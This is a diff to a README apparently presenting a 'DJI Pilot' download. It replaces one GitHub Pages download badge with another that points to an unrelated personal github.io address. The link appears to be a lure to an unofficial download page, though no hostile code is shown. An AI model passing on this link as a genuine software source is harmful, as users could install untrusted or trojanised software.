@@ -4,11 +4,8 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple124/v4/77/a8/fa/77a8fa4a-e97d-1927-ac69-b690056ca1c1/AppIcon-0-0-1x_U007emarketing-0-0-0-6-0-0-sRGB-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/1200x630wa.png" width="200" alt="DJI Pilot Icon">
 </div>
 
-<div align="center">
-  <a href="https://dji-pilot-professional.github.io/.github">
-    <img src="https://img.shields.io/badge/Download_DJI_Pilot-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download DJI Pilot">
-  </a>
-</div>
+[![GET DJI Pilot](https://img.shields.io/badge/GET%20%E2%80%94%20DJI-Pilot-0078D6?style=for-the-badge&logoColor=white)](https://dbennett16008.github.io/.github/DJI-Pilot)
+
 
 ---
 
